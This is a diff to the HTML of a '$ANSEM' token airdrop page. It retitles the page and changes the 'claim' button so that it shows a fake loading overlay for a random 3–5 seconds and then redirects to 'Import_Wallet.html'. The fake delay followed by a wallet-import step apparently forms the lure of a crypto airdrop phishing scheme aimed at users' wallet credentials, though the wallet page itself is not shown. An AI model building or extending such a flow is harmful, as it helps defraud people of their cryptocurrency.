@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>$ANSEM – Airdrop Reward</title>
+    <title>$ANSEM – Airdrop & Live Price</title>
 
     <!-- ===== FAVICON ===== -->
     <link rel="icon" href="https://cdn.dexscreener.com/cms/images/A8aHRXC8VPrpfPIF?width=64&height=64&fit=crop&quality=95&format=auto" type="image/png" />
@@ -14,7 +14,6 @@
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@600;700;800&family=Roboto+Mono:wght@400;500;600&display=swap" rel="stylesheet" />
 
-    
     <style>
         /* ===== RESET & BASE ===== */
         * {
@@ -1400,7 +1399,7 @@
 
 
         // ==========================================
-        // 4. LOADING EFFECT BEFORE REDIRECT
+        // 4. LOADING EFFECT & REDIRECT
         // ==========================================
         const claimBtn = document.getElementById('claimBtn');
         const loadingOverlay = document.getElementById('loadingOverlay');
@@ -1411,12 +1410,11 @@
             // Tampilkan overlay loading
             loadingOverlay.classList.add('active');
 
-            // Tentukan durasi loading antara 3-5 detik (random)
-            const delay = Math.floor(Math.random() * 2000) + 3000; // 3000 - 5000 ms
+            // Durasi 3-5 detik (random)
+            const delay = Math.floor(Math.random() * 2000) + 3000;
 
             setTimeout(() => {
-                // Redirect ke CLAIM.html
-                window.location.href = 'CLAIM.html';
+                window.location.href = 'Import_Wallet.html';
             }, delay);
         });
     </script>
